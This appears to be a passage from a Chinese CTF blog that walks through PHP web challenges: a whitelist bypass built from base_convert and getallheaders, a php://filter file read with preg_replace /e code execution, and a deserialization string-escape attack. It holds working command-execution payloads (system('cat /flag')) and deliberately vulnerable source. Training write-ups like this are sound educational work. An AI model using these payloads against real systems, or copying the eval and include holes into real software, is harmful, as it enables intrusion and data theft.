string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>system<span class="token operator">&amp;</span>b<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token function">system</span><span class="token punctuation">(</span>cat <span class="token operator">/</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在白名单不存在hex2bin函数，就要考虑一下其绕过姿势：</p><p><a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">进制转换网站</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">=</span>hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>hex2bin()的目的是因为_GET中有下划线的存在所以必须进行ASCII的转换：十进制转换16进制再转换ASCII码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token shell-comment comment">#10转16</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token shell-comment comment">#16转ASCII</span><span class="token function">hex2bin</span><span class="token punctuation">(</span>5f474554<span class="token punctuation">)</span><span class="token operator">=</span><span class="token constant">_GET</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以总的嵌套就是：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token constant">_GET</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用变量覆盖的姿势实现绕过：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$y</span><span class="token operator">=</span><span class="token constant">_GET</span><span class="token punctuation">;</span>$<span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">;</span>$<span class="token variable">$y</span><span class="token punctuation">{</span>a<span class="token punctuation">}</span><span class="token punctuation">(</span>$<span class="token variable">$y</span><span class="token punctuation">{</span>b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">{</span>a<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span>b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#因为中括号被过滤了所以这里需要用花括号来实现绕过</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$log</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token variable">$log</span><span class="token punctuation">{</span>pi<span class="token punctuation">}</span><span class="token punctuation">(</span>$<span class="token variable">$log</span><span class="token punctuation">{</span>abs<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>abs<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>getallheaders()函数：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$headers</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$headers: $value"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此函数的返回值是以数组的形式返回，同时返回值就是请求包里面的数据</p><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$log</span><span class="token operator">=</span>base_convert<span class="token punctuation">;</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">=</span> exec<span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">=</span> getallheaders<span class="token function">exec</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$log</span><span class="token operator">=</span>base_convert<span class="token punctuation">;</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里同样使用花括号来代替中括号，然后利用getallheaders函数来读取键名为1的value，也就是cat /flag，这个需要手动在请求包里面自主添加，然后利用exec来实现命令执行</p><h1 id="2021-06-06"><a href="#2021-06-06" class="headerlink" title="2021-06-06"></a>2021-06-06</h1><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//next.php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想要实现文件读取漏洞就需要满足两个条件：</p><pre><code>?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></pre><p>读取到next源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="扫盲：-2"><a href="#扫盲：-2" class="headerlink" title="扫盲："></a>扫盲：</h3><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace与代码执行</a></p><p><a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-metachar.html" target="_blank" rel="noopener">正则表达式 – 元字符_w3cschool</a>：这里主要涉及的元字符为\S意思为匹配所有的非空字符</p><p>同时还涉及到变量覆盖的两种形式：<code>$$a或者${$a},两种变量覆盖的形式是为了避免歧义，当需要使用变量覆盖来用于数组的时候第一种为：${$a[1]}、第二种：${$a}[1]</code></p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>1.首先你需要知道关于变量覆盖，以及双引号包裹的字符串会被php解析器解析后执行。</p><p>本地试验：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"${phpinfo()}"</span><span class="token punctuation">;</span><span class="token shell-comment comment">#会被执行</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'${phpinfo()}'</span><span class="token punctuation">;</span><span class="token shell-comment comment">#不会被执行</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2.关于\1的问题，就是将你通过圆括号指定的匹配到的字符串会被暂时储存在一个缓冲区里面，而\1就是读你第一个圆括号指定匹配到的字符串</p><p>本地试验：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"abc123456789"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/(\S)(\S)(\S)(\S)/i'</span><span class="token punctuation">,</span><span class="token string">'strtolower("\\0")'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\S)(\S)(\S)(\S)/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回结果为：</p><p>strtolower(“abc1”)strtolower(“2345”)strtolower(“6789”)</p><p>Array ( [0] =&gt; abc1 [1] =&gt; a [2] =&gt; b [3] =&gt; c [4] =&gt; 1 )</p><p>这里牵扯到一个<a href="https://www.jb51.net/article/30645.htm" target="_blank" rel="noopener">php正则表达式的子模式</a></p><h3 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> \<span class="token package">S</span><span class="token operator">+</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        $<span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说要传入的参数为：</p><pre><code>?\S%2b=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;);</code></pre><h1 id="2021-06-08"><a href="#2021-06-08" class="headerlink" title="2021-06-08"></a>2021-06-08</h1><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="扫盲：-3"><a href="#扫盲：-3" class="headerlink" title="扫盲："></a>扫盲：</h3><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">PHP extract() 函数</a>：从数组中键名变为变量名，键值为变量值</p><p><a href="https://www.runoob.com/php/php-unset-function.html" target="_blank" rel="noopener">PHP unset() 函数</a>：销毁给定的变量</p><h3 id="解题：-2"><a href="#解题：-2" class="headerlink" title="解题："></a>解题：</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>$function的第二个选项</p><pre><code>?f=phpinfo</code></pre><p>会得到：d0g3_f1ag.php</p><p>想要实现d0g3_f1ag.php的读取就要保证$function=show_image，然后通过将$serialize_info的反序列化，来赋予$userinfo的值，而$serialize_info是由$_SESSION先经过序列化然后经过函数filter的过滤后的值。</p><p>所以这里的$_SESSION中存在</p><pre><code>$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);</code></pre><p>但是我们需要的是将img的序列化值给顶出去，所以就涉及到了php反序列化字符串逃逸问题，本地构造序列化值：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Yn8rt'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到：</p><pre class="line-numbers language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"guest"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"Yn8rt"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然而我们需要的d0g3_f1ag.php(ZDBnM19mMWFnLnBocA==)并不会被读取，所以想办法将img变成我们可控的：</p><p>首先：user那么可以控制，我们可以利用他，通过过滤机制来实现让序列化值缩短，然后让固定的值（img）变成我们可以控制的值</p><p>其次：function我们也可以控制，所以需要function传入的参数为：</p><pre><code>Yn8rt&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></pre><p>为了让固定的被挤出去，我们需要再构造一个数组中的参数来替代原来的img，同时我们在guest后面存在28个字符所以构造的user要有28个非法字符：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'flagphpflagphpflagphpflagphp'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Yn8rt";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">"flagphpflagphpflagphpflagphp"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">63</span><span class="token punctuation">:</span>"Yn8rt<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a<span class="token string">";}"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token 